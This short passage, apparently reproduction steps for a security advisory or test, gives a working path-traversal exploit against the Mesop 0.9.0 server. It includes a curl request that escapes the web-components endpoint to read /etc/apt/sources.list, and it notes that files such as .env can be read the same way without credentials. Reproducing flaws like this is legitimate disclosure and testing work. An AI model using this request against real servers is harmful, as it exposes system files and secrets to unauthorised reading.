Start the vulnerable Mesop server:\n   \u2022 Ensure you are in the project root.\n   \u2022 Install dependencies:\n     $ pip install -r demo/requirements.txt\n   \u2022 Launch the server:\n     $ mesop demo/main.py\n   The server will listen on http://localhost:32123/.\n\n2. Trigger the path-traversal vulnerability:\n   Craft a GET against the \u201cweb components\u201d endpoint with enough \u201c../\u201d segments to escape to the target file. For example, to read /etc/apt/sources.list and the working directory is 6 levels deep:\n     $ curl -i http://localhost:32123/__web-components-module__/../../../../../../etc/apt/sources.list\n   You should receive a 200 OK and the contents of /etc/apt/sources.list in the response body.\n\n3. Notes:\n   \u2022 You can substitute any readable file path that includes an extension (e.g., `.yaml`, `.env`) as the last segment.  \n   \u2022 No credentials are required. The vulnerability is present in Mesop 0.9.0\u2019s unpatched static-file handler.",
